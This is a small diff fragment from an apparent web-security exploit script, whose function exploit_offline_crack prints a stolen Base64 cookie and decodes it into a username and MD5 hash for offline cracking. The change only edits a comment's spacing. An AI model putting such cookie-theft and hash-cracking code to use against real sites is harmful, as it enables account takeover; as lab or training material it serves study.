@@ -234,7 +234,7 @@ def exploit_offline_crack(url, exploit_server, password_list):
     encoded_cookie = match.group(1)
     print(f"[+] Stolen Cookie (Base64): {encoded_cookie}")
     
-    # 5. Decode and Extract Hash
+    # 5.Decode and Extract Hash
     try:
         decoded = base64.b64decode(encoded_cookie).decode()
         # Format: username:md5hash
